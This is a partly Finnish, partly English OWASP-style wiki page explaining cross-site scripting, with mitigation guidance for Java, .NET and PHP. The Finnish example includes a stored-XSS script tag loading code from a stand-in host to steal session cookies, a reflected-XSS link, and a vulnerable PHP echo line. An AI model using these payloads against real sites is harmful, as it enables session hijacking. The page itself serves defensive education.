**Esimerkki** Kaksi yleistä XSS-tyyppiä ovat pysyvä ja heijastuva eli
ei-pysyvä. Näiden erona on se, että pysyvässä XSS-haavoittuvuudessa
komento jää sovelluksen omaan tietokantaan.

Pysyvä: Hyökkääjä muuttaa haavoittuvan yhteisösivuston nimimerkkinsä
siten, että se sisältää komennon. Esim: "luser

<script src="http://example.com/~luser/xss.js">

</script>

". Tiedostossa xss.js oleva komento lähettää sivuston istuntotunnisteen
hyökkääjälle. Hän jättää sivustolle viestin, jolloin hänen nimimerkkinsä
näkyy otsikossa. Viestin lukevan toisen käyttäjän selain suorittaa hänen
tietämättään hyökkääjän komennon, minkä jälkeen hyökkääjällä on
mahdollisuus käyttää sivustoa hänen tunnuksillaan.

Ei-pysyvä: Käyttäjä on kirjautunut haavoittuvaan yhteisösivustoon, jonka
hakukentässä on XSS-haavoittuvuus. Samalla hän saa hyökkääjältä viestin,
joka kehottaa katsomaan annetun linkin, mikä todellisuudessa ohjaakin
osoitteeseen "<http://community.example> piste
com/search?term=qwert\<script....\>". Tällöin hakumoottori ilmoittaa
että hakutulos "qwert" ei tuottanut tuloksia, mutta samalla selain
suorittaa myös hyökkääjän komennon. Haavoittuvuuden toteutumisen
kannalta lopputulos on sama.

**Suositus** Tarkasta kaikki syötekentät ja koodaa niistä erikoismerkit
toiseen muotoon. Tarkasta ja käsittele myös kaikki kentät, jotka
liitetään osaksi vastausviestiä.

TODO: Käännä seuraavat

[Cross-site scripting](Cross-site_Scripting_\(XSS\) "wikilink"), better
known as XSS, is in fact a subset of HTML injection. XSS is the most
prevalent and pernicious web application security issue. XSS flaws occur
whenever an application takes data that originated from a user and sends
it to a web browser without first validating or encoding that content.

XSS allows attackers to execute scripts in the victim’s browser, which
can hijack user sessions, deface web sites, insert hostile content,
conduct phishing attacks, and take over the user’s browser using
scripting malware. The malicious script is usually JavaScript, but any
scripting language supported by the victim’s browser is a potential
target for this attack.

## Environments Affected

All web application frameworks are vulnerable to cross site scripting.

## Vulnerability

There are three known types of cross site scripting: reflected, stored,
and DOM injection. Reflected XSS is the easiest to exploit – a page will
reflect user supplied data directly back to the user:

`echo $_REQUEST['userinput'];`

Stored XSS takes hostile data, stores it in a file, a database, or other
back end system, and then at a later stage, displays the data to the
user, unfiltered. This is extremely dangerous in systems such as CMS,
blogs, or forums, where a large number of users will see input from
other individuals.

With DOM based XSS attacks, the site’s JavaScript code and variables are
manipulated rather than HTML elements.

Alternatively, attacks can be a blend or hybrid of all three types. The
danger with cross site scripting is not the type of attack, but that it
is possible. Non-standard or unexpected browser behaviors can introduce
subtle attack vectors. XSS is also potentially reachable through any
components that the browser uses.

Attacks are usually implemented in JavaScript, which is a powerful
scripting language. Using JavaScript allows attackers to manipulate any
aspect of the rendered page, including adding new elements (such as
adding a login tile which forwards credentials to a hostile site),
manipulating any aspect of the internal DOM tree, and deleting or
changing the way the page looks and feels. JavaScript allows the use of
XmlHttpRequest, which is typically used by sites using AJAX
technologies, even if victim site does not use AJAX today.

Using XmlHttpRequest, it is sometimes possible to get around a browser’s
same source origination policy - thus forwarding victim data to hostile
sites, and to create complex worms and malicious zombies that last as
long as the browser stays open. AJAX attacks do not have to be visible
or require user interaction to perform dangerous [cross site request
forgery (CSRF) attacks](Top_10_2007-A5 "wikilink").

## Verifying Security

The goal is to verify that all the parameters in the application are
validated and/or encoded before being included in HTML pages.

'''Automated approaches: '''Automated penetration testing tools are
capable of detecting reflected XSS via parameter injection, but often
fail to find persistent XSS, particularly if the output of the injected
XSS vector is prevented via authorization checks (such as if a user
inputs hostile data which only admins can see sometime later). Automated
source code scanning tools can find weak or dangerous APIs but usually
cannot determine if validation or encoding has taken place, which may
result in false positives. Neither tool type is able to find DOM based
XSS, which means that Ajax based applications will usually be at risk if
only automated testing takes place.[KSitnick-Stored XSS is called
persistent XSS here; we probably should use the same name consistently,
or at least mention above that they're the same thing (if that's
true)](category:FIXME "wikilink")

'''Manual approaches: '''If a centralized validation and encoding
mechanism is used, the most efficient way to verify security is to check
the code. If a distributed implementation is used, then the verification
will be considerably more time-consuming. Testing is time-consuming
because the attack surface of most applications is so large.

## Protection

The best protection for XSS is a combination of "whitelist" validation
of all incoming data and appropriate encoding of all output data.
Validation allows the detection of attacks, and encoding prevents any
successful script injection from running in the browser.

Preventing XSS across an entire application requires a consistent
architectural approach:

  - **Input validation.** Use a standard input validation mechanism to
    validate all input data for length, type, syntax, and business rules
    before accepting the data to be displayed or stored. Use an "accept
    known good" validation strategy. Reject invalid input rather than
    attempting to sanitize potentially hostile data. Do not forget that
    error messages might also include invalid data.
  - **Strong output encoding.** Ensure that all user-supplied data is
    appropriately entity encoded (either HTML or XML depending on the
    output mechanism) before rendering, taking the approach to encode
    all characters other than a very limited subset. This is the
    approach of the Microsoft Anti-XSS library, and the forthcoming
    OWASP PHP Anti-XSS library. Also, set the character encodings for
    each page you output, which will reduce exposure to some variants.
  - '''Specify the output encoding '''(such as ISO 8859-1 or UTF 8). Do
    not allow the attacker to choose this for your users.
  - **Do not** '''use "blacklist" validation '''to detect XSS in input
    or to encode output. Searching for and replacing just a few
    characters ("\<" "\>" and other similar characters or phrases such
    as “script”) is weak and has been attacked successfully. Even an
    unchecked “<b>” tag is unsafe in some contexts. XSS has a surprising
    number of variants that make it easy to bypass blacklist validation.
  - **Watch out for canonicalization errors.** Inputs must be decoded
    and canonicalized to the application’s current internal
    representation before being validated. Make sure that your
    application does not decode the same input twice. Such errors could
    be used to bypass whitelist schemes by introducing dangerous inputs
    after they have been checked.

Language specific recommendations:

  - **Java: Use Struts output mechanisms such** as \<bean:write … \>, or
    use the default JSTL escapeXML="true" attribute in \<c:out … \>. Do
    NOT use \<%= … %\> unnested (that is, outside of a properly encoded
    output mechanism)
  - '''.NET: Use the Microsoft Anti-XSS Library '''1.5 freely available
    from MSDN. Do not assign form fields data directly from the Request
    object: `username.Text = Request.QueryString("username");` without
    using this library. Understand which .NET controls automatically
    encode output data
  - **PHP: Ensure output is passed through `htmlentities()` or
    `htmlspecialchars()`** or use the soon to be released OWASP PHP
    Anti-XSS library. **Disable register_globals** if it is not already
    disabled

## Samples

  - [<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4206>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4206%20)
  - [<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3966>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3966%20)
  - [<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5204>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5204%20)

## Related Pages

  - [:Category:OWASP Stinger
    Project](:Category:OWASP_Stinger_Project "wikilink")
  - [Testing for Cross site
    scripting](Testing_for_Cross_site_scripting "wikilink")
  - [OWASP PHP Filters](OWASP_PHP_Filters "wikilink")
  - [:Category:OWASP Encoding
    Project](:Category:OWASP_Encoding_Project "wikilink")

## References

  - CWE: CWE-79, Cross-Site scripting (XSS)
  - WASC Threat Classification:
    <http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml>
  - OWASP – [Cross-site Scripting
    (XSS)](Cross-site_Scripting_\(XSS\) "wikilink")
  - OWASP – [Testing for Cross site
    scripting](Testing_for_Cross_site_scripting "wikilink")
  - OWASP [Stinger Project](:Category:OWASP_Stinger_Project "wikilink")
    (A Java EE validation filter)
  - OWASP [PHP Filter Project](OWASP_PHP_Filters "wikilink")
  - OWASP [Encoding
    Project](:Category:OWASP_Encoding_Project "wikilink")
  - RSnake, XSS Cheat Sheet, <http://ha.ckers.org/xss.html>
  - Klein, A., DOM Based Cross Site Scripting,
    <http://www.webappsec.org/projects/articles/071105.shtml>
  - .NET Anti-XSS Library -
    <http://www.microsoft.com/downloads/details.aspx?FamilyID=efb9c819-53ff-4f82-bfaf-e11625130c25&DisplayLang=en>